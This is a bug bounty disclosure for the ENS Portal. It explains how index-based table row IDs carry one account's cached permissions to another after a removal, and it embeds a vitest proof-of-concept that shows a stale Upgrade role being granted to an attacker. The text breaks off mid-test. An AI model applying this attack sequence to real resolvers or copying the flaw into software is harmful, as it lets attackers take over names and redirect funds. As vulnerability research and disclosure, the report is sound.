# 92535 w a critical portal row reuse can grant one resolver delegate another account s upgrade role

**Submitted on Sep 10th 2026 at 14:49:05 UTC by @IronsideSec for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92535
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief / Introduction

The resolver Roles page gives TanStack Table no stable row-ID function, so each row is identified only by its current array index (`"0"`, `"1"`, ...). The edit sidebar separately caches the checked permission map and resets it only when that positional ID changes.

If a victim removes adjacent account A, waits for the normal successful transaction/refetch, and then edits successor account B, B moves into A's old row ID. The sidebar now displays B's address but retains A's checked roles. If the victim makes a legitimate change for B—for example, checks only **ABI**—the Portal computes and submits the union of that requested role and A's retained roles for **B**.

The decisive root-role trace is:

```
Before removal: A row "0" = Pubkey + Upgrade; B row "1" = Pubkey
After refetch:  B row "0" = Pubkey
Sidebar target: B, but editable map still contains A's Upgrade=true
Victim action:  checks only ABI, then saves
Submitted call: grantRootRoles(UPGRADE | SET_ABI, B)
B's result:     PUBKEY | SET_ABI | UPGRADE
```

A malicious B can then call `upgradeToAndCall` and replace the shared resolver implementation. The complete Portal-source test and pinned Sepolia fork test below reproduce this chain without a ZIP or private dependency.

## Vulnerability Details

### Root cause: account identity is split from cached permission state

[`DataTable.tsx:33-47`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/components/DataTable.tsx#L33-L47) creates the table without TanStack's `getRowId`; rows therefore use current array indexes. [`ResolverRolesTable.tsx:97-137`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx#L97-L137) stores the selected row object in `editingRow` while keeping the sidebar mounted.

The sidebar reads the current account from `row.original`, but keeps editable permissions in separate component state. [`ResolverRolesSidebar.tsx:175-184`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L175-L184) resets that state only when `row.id !== prevRowId`:

```tsx
  if (row && row.id !== prevRowId) {
    setPrevRowId(row.id)
    setEditedPermissions(roleToPermissions(row.original.decodedRoles))
  }
```

Removal polls the indexer and invalidates `resolver-overview` at [`ResolverRolesSidebar.tsx:251-287`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L251-L287). The transaction completion handler at [lines 503-508](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L503-L508) closes the modal and sheet, but does not clear `editingRow`, `prevRowId`, or `editedPermissions`.

Consequently, after A disappears and B shifts from row `"1"` to `"0"`:

* `row.original.account` and the sidebar heading become B;
* `row.id` remains `"0"`, the same value cached for A;
* the reset condition is false; and
* A's permission map remains attached to B.

This is a cross-account authorization bug. It is not merely a stale label or stale visual row.

### The visible checkbox does not disclose the cross-account grant

This report does **not** claim that **Upgrade** is invisible. The stale Upgrade checkbox is visibly checked after B opens. The security problem is its meaning: the dialog has just switched to B, so an unchanged checked control appears to describe B's existing state. It provides no warning or diff that **Upgrade came from removed account A and will be newly granted to B**. The table summary still says B has only Pubkey, so a user who carefully cross-checks both views can notice the inconsistency; the normal save flow does not explain it.

The transaction modal says **Save resolver role changes** / **Update roles for B**, but does not enumerate ABI and Upgrade separately ([`ResolverRolesSidebar.tsx:339-349`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L339-L349)). The wallet receives one valid contract call. Simulation cannot detect that Upgrade came from stale UI state.

Thus the claim is narrow: a victim can leave the apparently pre-existing Upgrade checkbox unchanged, intentionally add ABI, and approve a transaction that grants both to B. It requires two visible wallet actions—remove A, then update B—not a hidden transaction.

### Exact save semantics

[`computeRoleChanges`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/rolesToPermissions.ts#L66-L105) compares B's true on-chain roles against the retained edit map. With B's true role `PUBKEY`, retained `UPGRADE=true`, and the victim's new `ABI=true`, it returns:

```
rolesToGrant = UPGRADE | SET_ABI
rolesToRevoke = 0
```

[`handleSaveChanges`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L295-L305) binds that union to the **current B account**. The modal and mutation consume the same pending action ([lines 467-501](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L467-L501)). [`prepareGrantResolverRolesTransaction`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts#L29-L74) selects the root path and encodes:

```solidity
grantRootRoles(0x10000000000000000000000000010000, B)
```

`0x10000` is `SET_ABI`; bit 124 is `UPGRADE`. The complete test captures this exact calldata from the frozen Portal code.

### Threat model and reproducible preconditions

The primary scenario uses unrelated A, a malicious existing limited delegate B, and a connected victim who owns/administers the resolver:

1. The victim can access the resolver Roles route and has the role-admin authority needed to revoke A and grant ABI/Upgrade. The PoC initializes this victim with `ALL_ROLES`, satisfying both the Portal's route-management check and the contract's grant/revoke checks.
2. B initially has only a limited, non-Upgrade role (Pubkey in the PoC). B cannot call `upgradeToAndCall`.
3. A has the dangerous Upgrade assignment and no other surviving assignment/account group. Fully revoking A therefore removes A from the returned table.
4. B is A's immediate successor in the actual refetched grouped-account order, so B receives A's former positional ID.
5. The victim legitimately removes A through the Portal and waits for the successful refetch.
6. B requests a legitimate ABI permission, or the victim otherwise edits B next.
7. The victim leaves the stale checked Upgrade control unchanged, checks ABI, and saves.
8. B receives fresh Upgrade authority, then replaces the resolver implementation.

B does not need a front-run, injected browser state, failed transaction, compromised owner key, or prior Upgrade authority. Role data is publicly queryable, so B can inspect the returned ordering and act only when the conditions exist. The attacker cannot force every victim's ordering; A's complete disappearance, B's immediate-successor position, and the victim's next edit are real preconditions.

Current Panoptes observations show that removals compact the returned list and that multi-row ordering exists. A passive sample of the latest 1,000 EAC role-change events contained 58 events whose new bitmap was zero. Follow-up queries showed fully revoked rows omitted, including three resolvers that returned `roleHolderCount: 0` and `roles: []`. A separate captured resolver returned four current rows in non-increasing latest-change timestamp order, with its older owner root row last. `groupRolesByAccount` preserves first-seen order. This non-random evidence is not a prevalence estimate and does not prove every multi-row resolver is exploitable. Equal timestamps have no explicit tie-breaker; the report does not rely on a claim that every row has a distinct timestamp.

### Different root cause and fix from aggregate-removal over-revocation

A separate report concerns removal code that unions roles from multiple scoped rows and then revokes that aggregate bitmap. This finding does not require aggregate removal and does not depend on the removed bitmap being too broad:

|                     | This finding                                                                | Aggregate-removal finding                                     |
| ------------------- | --------------------------------------------------------------------------- | ------------------------------------------------------------- |
| Vulnerable action   | Editing B after A is removed/refetched                                      | Removing one selected assignment                              |
| Wrong binding       | A's cached checked state is rebound to B                                    | Roles from other scopes enter a revoke bitmap                 |
| Dangerous call here | `grantRootRoles(UPGRADE \| SET_ABI, B)`                                     | An over-broad revoke call                                     |
| Primary fix         | Stable account row IDs + reset edit state when the selected account changes | Scope removal bitmap and contract call to selected assignment |

Either fix can be applied while the other bug remains. Shared UI component location is not a shared root cause.

The scope's known-issue preamble also states that a demonstrated security consequence—its example is “a role combination that grants authority it should not”—goes beyond listed functional/UX breakage and is a new finding. This PoC proves exactly such fresh authority and its Critical transaction consequence. `QA-01` itself concerns follow-up failures after name transfers; it does not disclose this positional cross-account state binding or its stable-row/reset fix.

### Recommended fix

1. Let `DataTable` accept a `getRowId` callback, and have `ResolverRolesTable` pass the normalized grouped-account address (for example, `row => row.account.toLowerCase()`).
2. Key and reset sidebar edit state by resolver plus `row.original.account`, not positional `row.id`.
3. On successful removal, clear `editingRow`, `prevRowId`, pending action, and edited permissions before invalidation/refetch.
4. Reset through `useEffect` when the resolver, account, or source role set changes; do not call a state setter during render.
5. Before submission, rebuild the role delta from fresh on-chain/indexer state and display each role that will be granted or revoked.
6. Add the regression sequence `A:0, B:1 -> remove A -> B:0 -> edit B` for root and name-scoped rows.

## Impact Details

A root `UPGRADE` holder passes the deployed Permissioned Resolver upgrade authorization. The fork test gives B only Pubkey initially, submits the exact Portal-produced stale grant, and then shows B successfully replacing the proxy implementation with malicious code.

The replacement controls all names that share that resolver. Through the deployed Universal Resolver, both victim names return attacker-controlled text, and `addr(bytes32)` resolves to B. This enables profile/contact replacement and cryptocurrency-address redirection for all attached names. The negative control resets the form before saving; B then gets ABI only and the same upgrade call fails.

The upgraded proxy cannot be rolled back in place when the malicious implementation omits the upgrade entrypoint. Recovery is possible, so this report does not claim permanent irreversibility: the name owner can deploy a clean resolver, detach each name in the registry, and restore records. The fork proves this is per-name cleanup: detaching the first label repairs its Universal Resolver path while the second label remains attacker-controlled until separately detached. Prior misdirected interactions cannot be retroactively repaired.

This maps directly to listed Critical impact **6288: “Malicious interactions with an already-connected wallet,” including “Modifying transaction arguments or parameters” and “Submitting malicious transactions.”** The victim deliberately changes only B's ABI permission, while stale cross-account state makes the scoped Portal generate `SET_ABI | UPGRADE` for B. B's later resolver-implementation replacement is the proved consequence of that modified role-bitmap argument. This report does not characterize the victim-created resolver proxy as a central ENS protocol contract, and it does not require a contract defect: the contract faithfully executes the malformed authorization generated by the in-scope Portal.

## References

* [ENS competition impacts and scope](https://immunefi.com/audit-competition/audit-competition-ens/scope/)
* [Deployed Sepolia Verifiable Factory](https://sepolia.etherscan.io/address/0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef#code)
* [Deployed Sepolia Permissioned Resolver implementation](https://sepolia.etherscan.io/address/0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e#code)
* [Deployed Sepolia Universal Resolver](https://sepolia.etherscan.io/address/0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe#code)
* [Deployed Sepolia ETH Registry](https://sepolia.etherscan.io/address/0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2#code)
* [Scoped Explorer asset](https://github.com/immunefi-team/audit-comp-ens/tree/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal)
* [`DataTable` without stable `getRowId`](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/components/DataTable.tsx#L33-L47)
* [Selected row retained around the table](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx#L97-L137)
* [Positional reset condition](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L193)
* [Removal invalidation and polling](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L251-L287)
* [Role-diff construction](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/rolesToPermissions.ts#L66-L105)
* [Root/name grant transaction selection](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts#L29-L74)
* [Resolver role constants](https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L24-L44)

## Proof of Concept

## Proof of Concept

The complete PoC is embedded below. **No ZIP or attachment is required.** It has two layers:

* a frozen-source Portal test that mounts the real `DataTable`, `ResolverRolesTable`, `ResolverRolesSidebar`, role-diff logic, ENSJS preparation, modal intent, mutation, and ABI encoding; and
* a pinned Sepolia fork test that uses the deployed Verifiable Factory, Permissioned Resolver implementation, ETH Registrar, registry, USDC, and Universal Resolver.

Local substitutes in the Portal layer are the resolver-overview responses, transaction modal button, indexer polling, wallet/public clients, and mutation transport. The stateful UI and transaction-construction path under test are product code. The fork writes only to local fork state; it sends no transaction to Sepolia.

### Prerequisites and paths

Use the frozen repository, Node.js 22 with its lockfile-installed workspaces, Foundry, and the included Solidity 0.8.30 configuration. Create `audit_workspace/renewed/lead034-rowid-stale-high/` and save every block below relative to that directory. The test uses a public read-only Tenderly Sepolia RPC and pins block `11,673,299`.

### `rowid-stale-save.test.tsx`

```tsx
import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import type { PropsWithChildren } from 'react'
import { afterEach } from 'vitest'
import { decodeFunctionData, parseAbi, toHex, type Address } from 'viem'
import { packetToBytes } from 'viem/ens'

const mocks = vi.hoisted(() => ({
  startTransaction: vi.fn(),
  waitForTransaction: vi.fn(),
  pollForIndexerSync: vi.fn(),
  openModal: vi.fn(),
  closeModal: vi.fn(),
  clearTransaction: vi.fn(),
  preparedIntent: undefined as any,
  activeTransaction: undefined as any,
  walletClient: {
    account: { address: '0x1111111111111111111111111111111111111111' },
    chain: { id: 11155111 },
  } as any,
  publicClient: {} as any,
}))

const VICTIM = '0x1111111111111111111111111111111111111111' as const
const ACCOUNT_A = '0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' as const
const ATTACKER_B = '0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb' as const
const RESOLVER = '0x4444444444444444444444444444444444444444' as const
const NAME = 'lead034-victim.eth'
const CHAIN_ID = 11155111

vi.mock('@/lib/wagmi', () => ({ sepoliaWithEns: { id: 11155111 } }))
vi.mock('@/hooks/use-mobile', () => ({ useIsMobile: () => false }))
vi.mock('@/features/registry/utils/signer.helpers', () => ({
  createEOASigner: () => ({ kind: 'deterministic-signer' }),
}))
vi.mock('@/utils/query/pollForIndexerSync', () => ({
  pollForIndexerSync: mocks.pollForIndexerSync,
}))
vi.mock('@/features/transaction-manager/hooks/useTransactionModal', () => ({
  useTransactionModal: () => ({
    openModal: mocks.openModal,
    closeModal: mocks.closeModal,
    clearTransaction: mocks.clearTransaction,
  }),
}))
vi.mock('@/components/CopyButton', () => ({ CopyButton: () => null }))
vi.mock('@/components/EntityBadge', () => ({
  EntityBadge: ({ children }: PropsWithChildren) => <span>{children}</span>,
}))
vi.mock('@ens-apps/transaction-manager', () => ({
  transactionManager: { startTransaction: mocks.startTransaction },
  waitForTransaction: mocks.waitForTransaction,
}))

// Keep ResolverRolesTable, ResolverRolesSidebar, DataTable and every calldata
// helper real. This narrow harness only exposes the descriptor that the real
// sidebar hands to the transaction modal. "Complete" models the modal's
// successful onDone callback after the captured production mutation settles.
vi.mock('@/features/transaction-manager/components/TransactionModal', () => ({
  TransactionModal: ({ transactions }: { transactions: any[] }) => {
    const transaction = transactions[0]
    mocks.activeTransaction = transaction
    return transaction?.intent?.prepare ? (
      <section aria-label="Captured transaction modal">
        <button
          type="button"
          onClick={() => {
            mocks.preparedIntent = transaction.intent.prepare({
              walletClient: mocks.walletClient,
              publicClient: mocks.publicClient,
              chainId: CHAIN_ID,
            })
            transaction.onStart()
          }}
        >
          Execute captured modal action
        </button>
        <button type="button" onClick={() => transaction.onDone()}>
          Complete captured modal action
        </button>
      </section>
    ) : null
  },
}))

import { ResolverRolesTable } from '../../../apps/portal/src/features/resolver/components/ResolverRolesTable'
import type {
  ResolverNode,
  ResolverRole,
} from '../../../apps/portal/src/features/resolver/hooks/useResolverOverview'
import {
  computeNameResource,
  resolverPermissions,
  resolverRoles,
} from '../../../apps/portal/src/lib/roles/resolverRoles'
import { truncateAddress } from '../../../apps/portal/src/utils/formatting/truncateAddress'

const roleAbi = parseAbi([
  'function authorizeNameRoles(bytes toName, uint256 roleBitmap, address account, bool grant) returns (bool)',
  'function grantRootRoles(uint256 roleBitmap, address account) returns (bool)',
  'function revokeRootRoles(uint256 roleBitmap, address account) returns (bool)',
])

const makeRole = (
  account: Address,
  roleBitmap: bigint,
  blockNumber: number,
): ResolverRole => ({
  account,
  resource: computeNameResource(NAME),
  roleBitmap: toHex(roleBitmap),
  blockNumber,
  transactionHash: `0x${blockNumber.toString(16).padStart(64, '0')}`,
  timestamp: blockNumber,
  name: NAME,
})

const accountARole = makeRole(
  ACCOUNT_A,
  resolverRoles.ROLE_SET_PUBKEY | resolverRoles.ROLE_SET_TEXT,
  101,
)
const attackerBRole = makeRole(ATTACKER_B, resolverRoles.ROLE_SET_PUBKEY, 100)
const ROOT_RESOURCE = `0x${'00'.repeat(32)}`
const makeRootRole = (
  account: Address,
  roleBitmap: bigint,
  blockNumber: number,
): ResolverRole => ({
  account,
  resource: ROOT_RESOURCE,
  roleBitmap: toHex(roleBitmap),
  blockNumber,
  transactionHash: `0x${blockNumber.toString(16).padStart(64, '0')}`,
  timestamp: blockNumber,
  name: null,
})
const accountARootRole = makeRootRole(
  ACCOUNT_A,
  resolverRoles.ROLE_SET_PUBKEY | resolverRoles.ROLE_UPGRADE,
  201,
)
const attackerBRootRole = makeRootRole(
  ATTACKER_B,
  resolverRoles.ROLE_SET_PUBKEY,
  200,
)
// Panoptes also returns the resolver owner's ordinary root assignment. Keep it
// as the oldest row so the production-shaped order is A, B, owner before A's
// full revoke and B, owner after the compacting refetch.
const ALL_RESOLVER_ROLES = BigInt(
  '0x1111111111111111111111111111111111111111111111111111111111111111',
)
const ownerRootRole = makeRootRole(VICTIM, ALL_RESOLVER_ROLES, 1)
const nodes: ResolverNode[] = [
  {
    id: computeNameResource(NAME),
    name: NAME,
    owner: { id: VICTIM },
    resolver: { id: RESOLVER, address: RESOLVER },
  },
]

let queryClient: QueryClient

const QueryWrapper = ({ children }: PropsWithChildren) => (
  <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
)

const managerCheckbox = (roleKey: string): HTMLButtonElement => {
  const checkbox = document.getElementById(`${roleKey}-manager`)
  expect(checkbox).toBeTruthy()
  return checkbox as HTMLButtonElement
}

const isChecked = (element: HTMLElement) =>
  element.getAttribute('data-state') === 'checked'

const visibleManagerState = () =>
  Object.fromEntries(
    resolverPermissions.map(({ key }) => [key, isChecked(managerCheckbox(key))]),
  )

const changedVisibleManagerControls = (
  before: Record<string, boolean>,
  after: Record<string, boolean>,
) => Object.keys(before).filter((key) => before[key] !== after[key])

describe('LEAD-034: index row identity carries stale permissions to a new account', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    queryClient = new QueryClient({
      defaultOptions: {
        queries: { retry: false, gcTime: 0 },
        mutations: { retry: false },
      },
    })
    mocks.preparedIntent = undefined
    mocks.activeTransaction = undefined
    ;(globalThis as any).__lead034WalletClient = mocks.walletClient
    ;(globalThis as any).__lead034PublicClient = mocks.publicClient
    mocks.pollForIndexerSync.mockResolvedValue(undefined)
    mocks.startTransaction.mockReturnValue('lead-034-transaction')
    mocks.waitForTransaction.mockResolvedValue({ hash: `0x${'99'.repeat(32)}` })
  })

  afterEach(() => {
    cleanup()
    queryClient.clear()
  })

  it('removes row 0, refetches, then grants row 0 successor stale TEXT plus intentionally selected ABI', async () => {
    const view = render(
      <QueryWrapper>
        <ResolverRolesTable
          roles={[accountARole, attackerBRole, ownerRootRole]}
          nodes={nodes}
          resolverAddress={RESOLVER}
          canManageRoles
        />
      </QueryWrapper>,
    )

    // TanStack's generic DataTable assigns array-index row ids because the
    // production table supplies no getRowId. Account A is row "0" and B is
    // row "1" and the owner is row "2". Open A through the real edit action.
    const initialEditButtons = screen.getAllByRole('button', {
      name: 'Edit user roles',
    })
    expect(initialEditButtons).toHaveLength(3)
    fireEvent.click(initialEditButtons[0])

    await waitFor(() =>
      expect(document.querySelector('[data-slot="sheet-title"]')?.textContent).toBe(
        truncateAddress(ACCOUNT_A.toLowerCase() as Address, 6, 4),
      ),
    )
    expect(screen.getAllByText(`Roles scoped to ${NAME}`)).toHaveLength(1)
    expect(isChecked(managerCheckbox('ROLE_SET_TEXT'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_SET_PUBKEY'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_SET_ABI'))).toBe(false)

    // Actual Remove A UI and confirmation path.
    fireEvent.click(screen.getByRole('button', { name: 'Remove user' }))
    expect(
      await screen.findByText(
        'Are you sure you want to remove this user from all roles? This action cannot be undone.',
      ),
    ).toBeTruthy()
    fireEvent.click(screen.getByRole('button', { name: 'Remove' }))
    fireEvent.click(
      await screen.findByRole('button', {
        name: 'Execute captured modal action',
      }),
    )
    await waitFor(() => expect(mocks.startTransaction).toHaveBeenCalledTimes(1))

    const removeIntent = mocks.startTransaction.mock.calls[0][0]
    const decodedRemove = decodeFunctionData({
      abi: roleAbi,
      data: removeIntent.request.data,
    })
    expect(decodedRemove.args[0]).toBe(toHex(packetToBytes(NAME)))
    expect(decodedRemove.args[1]).toBe(
      resolverRoles.ROLE_SET_PUBKEY | resolverRoles.ROLE_SET_TEXT,
    )
    expect((decodedRemove.args[2] as string).toLowerCase()).toBe(ACCOUNT_A)
    expect(decodedRemove.args[3]).toBe(false)
    fireEvent.click(
      screen.getByRole('button', { name: 'Complete captured modal action' }),
    )

    // Model the resolver-overview invalidation/refetch: the parent supplies
    // B and the owner's ordinary root row while ResolverRolesTable and its
    // sidebar retain component state. B is now the first array entry and
    // therefore reuses TanStack row id "0".
    view.rerender(
      <QueryWrapper>
        <ResolverRolesTable
          roles={[attackerBRole, ownerRootRole]}
          nodes={nodes}
          resolverAddress={RESOLVER}
          canManageRoles
        />
      </QueryWrapper>,
    )
    const refetchedEditButtons = screen.getAllByRole('button', {
      name: 'Edit user roles',
    })
    expect(refetchedEditButtons).toHaveLength(2)
    fireEvent.click(refetchedEditButtons[0])

    // Header/account/scope come from current B's row object. The permission
    // state did not reset because current B and removed A both have row.id=0.
    await waitFor(() =>
      expect(document.querySelector('[data-slot="sheet-title"]')?.textContent).toBe(
        truncateAddress(ATTACKER_B.toLowerCase() as Address, 6, 4),
      ),
    )
    expect(screen.getAllByText(`Roles scoped to ${NAME}`)).toHaveLength(1)
    expect(isChecked(managerCheckbox('ROLE_SET_PUBKEY'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_SET_TEXT'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_SET_ABI'))).toBe(false)

    // The victim intentionally changes exactly one visible control: ABI.
    const visibleBefore = visibleManagerState()
    fireEvent.click(managerCheckbox('ROLE_SET_ABI'))
    const visibleAfter = visibleManagerState()
    expect(visibleBefore.ROLE_SET_PUBKEY).toBe(true)
    expect(visibleBefore.ROLE_SET_TEXT).toBe(true)
    expect(visibleBefore.ROLE_SET_ABI).toBe(false)
    expect(changedVisibleManagerControls(visibleBefore, visibleAfter)).toEqual([
      'ROLE_SET_ABI',
    ])

    fireEvent.click(screen.getByRole('button', { name: 'Save' }))
    fireEvent.click(
      await screen.findByRole('button', {
        name: 'Execute captured modal action',
      }),
    )
    await waitFor(() => expect(mocks.startTransaction).toHaveBeenCalledTimes(2))

    const saveIntent = mocks.startTransaction.mock.calls[1][0]
    expect(saveIntent).toEqual(mocks.preparedIntent)
    expect(saveIntent.request.to).toBe(RESOLVER)
    const decodedSave = decodeFunctionData({
      abi: roleAbi,
      data: saveIntent.request.data,
    })
    const staleTextPlusSelectedAbi =
      resolverRoles.ROLE_SET_TEXT | resolverRoles.ROLE_SET_ABI
    expect(staleTextPlusSelectedAbi).toBe(0x10010n)
    expect(decodedSave.functionName).toBe('authorizeNameRoles')
    expect(decodedSave.args[0]).toBe(toHex(packetToBytes(NAME)))
    expect(decodedSave.args[1]).toBe(0x10010n)
    expect((decodedSave.args[2] as string).toLowerCase()).toBe(ATTACKER_B)
    expect(decodedSave.args[3]).toBe(true)
    expect(mocks.startTransaction.mock.calls[1][2]).toEqual(
      expect.objectContaining({
        id: 'tx-save-resolver-roles',
        description: `Grant resolver roles for ${NAME}`,
        chainId: CHAIN_ID,
      }),
    )

    console.log('initial_tanstack_row_ids=A:0,B:1,owner:2')
    console.log('refetched_tanstack_row_ids=B:0,owner:1')
    console.log(`current_sidebar_account=${ATTACKER_B}`)
    console.log(`current_sidebar_scope=${NAME}`)
    console.log('stale_text_checkbox_before_user_action=true')
    console.log('only_intentionally_toggled_checkbox=ROLE_SET_ABI')
    console.log(`remove_A_calldata=${removeIntent.request.data}`)
    console.log(`submitted_function=${decodedSave.functionName}`)
    console.log(`submitted_name=${NAME}`)
    console.log(`submitted_bitmap=0x${(decodedSave.args[1] as bigint).toString(16)}`)
    console.log(`submitted_account=${decodedSave.args[2]}`)
    console.log(`submitted_grant=${decodedSave.args[3]}`)
    console.log(`submitted_calldata=${saveIntent.request.data}`)
  })

  it('carries stale root UPGRADE to B and emits grantRootRoles when the victim checks only ABI', async () => {
    const view = render(
      <QueryWrapper>
        <ResolverRolesTable
          roles={[accountARootRole, attackerBRootRole, ownerRootRole]}
          nodes={nodes}
          resolverAddress={RESOLVER}
          canManageRoles
        />
      </QueryWrapper>,
    )

    const initialEditButtons = screen.getAllByRole('button', {
      name: 'Edit user roles',
    })
    expect(initialEditButtons).toHaveLength(3)
    fireEvent.click(initialEditButtons[0])
    await waitFor(() =>
      expect(document.querySelector('[data-slot="sheet-title"]')?.textContent).toBe(
        truncateAddress(ACCOUNT_A.toLowerCase() as Address, 6, 4),
      ),
    )
    expect(screen.getByText('Global roles (all names)')).toBeTruthy()
    expect(isChecked(managerCheckbox('ROLE_SET_PUBKEY'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_UPGRADE'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_SET_ABI'))).toBe(false)

    fireEvent.click(screen.getByRole('button', { name: 'Remove user' }))
    fireEvent.click(await screen.findByRole('button', { name: 'Remove' }))
    fireEvent.click(
      await screen.findByRole('button', {
        name: 'Execute captured modal action',
      }),
    )
    await waitFor(() => expect(mocks.startTransaction).toHaveBeenCalledTimes(1))
    const removeIntent = mocks.startTransaction.mock.calls[0][0]
    const decodedRemove = decodeFunctionData({
      abi: roleAbi,
      data: removeIntent.request.data,
    })
    expect(decodedRemove.functionName).toBe('revokeRootRoles')
    expect(decodedRemove.args[0]).toBe(
      resolverRoles.ROLE_SET_PUBKEY | resolverRoles.ROLE_UPGRADE,
    )
    expect((decodedRemove.args[1] as string).toLowerCase()).toBe(ACCOUNT_A)
    fireEvent.click(
      screen.getByRole('button', { name: 'Complete captured modal action' }),
    )

    view.rerender(
      <QueryWrapper>
        <ResolverRolesTable
          roles={[attackerBRootRole, ownerRootRole]}
          nodes={nodes}
          resolverAddress={RESOLVER}
          canManageRoles
        />
      </QueryWrapper>,
    )
    fireEvent.click(
      screen.getAllByRole('button', { name: 'Edit user roles' })[0],
    )
    await waitFor(() =>
      expect(document.querySelector('[data-slot="sheet-title"]')?.textContent).toBe(
        truncateAddress(ATTACKER_B.toLowerCase() as Address, 6, 4),
      ),
    )
    expect(screen.getByText('Global roles (all names)')).toBeTruthy()
    expect(isChecked(managerCheckbox('ROLE_SET_PUBKEY'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_UPGRADE'))).toBe(true)
    expect(isChecked(managerCheckbox('ROLE_SET_ABI'))).toBe(false)

    const beforeClick = visibleManagerState()
    fireEvent.click(managerCheckbox('ROLE_SET_ABI'))
    const afterClick = visibleManagerState()
    expect(beforeClick.ROLE_SET_PUBKEY).toBe(true)
    expect(beforeClick.ROLE_UPGRADE).toBe(true)
    expect(beforeClick.ROLE_SET_ABI).toBe(false)
    expect(changedVisibleManagerControls(beforeClick, afterClick)).toEqual([
      'ROLE_SET_ABI',
    ])

    fireEvent.click(screen.getByRole('button', { name: 'Save' }))
    fireEvent.click(
      await screen.findByRole('button', {
        name: 'Execute captured modal action',
      }),
    )
    await waitFor(() => expect(mocks.startTransaction).toHaveBeenCalledTimes(2))
    const saveIntent = mocks.startTransaction.mock.calls[1][0]
    const decodedSave = decodeFunctionData({
      abi: roleAbi,
      data: saveIntent.request.data,
    })
    const staleUpgradePlusSelectedAbi =
      resolverRoles.ROLE_UPGRADE | resolverRoles.ROLE_SET_ABI
    expect(decodedSave.functionName).toBe('grantRootRoles')
    expect(decodedSave.args[0]).toBe(staleUpgradePlusSelectedAbi)
    expect((decodedSave.args[1] as string).toLowerCase()).toBe(ATTACKER_B)
    expect(mocks.startTransaction.mock.calls[1][2]).toEqual(
      expect.objectContaining({
        id: 'tx-save-resolver-roles',
        description: 'Grant resolver roles for (root)',
        chainId: CHAIN_ID,
      }),
    )

    console.log('root_initial_tanstack_row_ids=A:0,B:1,owner:2')
    console.log('root_refetched_tanstack_row_ids=B:0,owner:1')
    console.log(`root_current_sidebar_account=${ATTACKER_B}`)
    console.log('root_stale_upgrade_checkbox_before_user_action=true')
    console.log('root_only_intentionally_toggled_checkbox=ROLE_SET_ABI')
    console.log(`root_remove_A_calldata=${removeIntent.request.data}`)
    console.log(`root_submitted_function=${decodedSave.functionName}`)
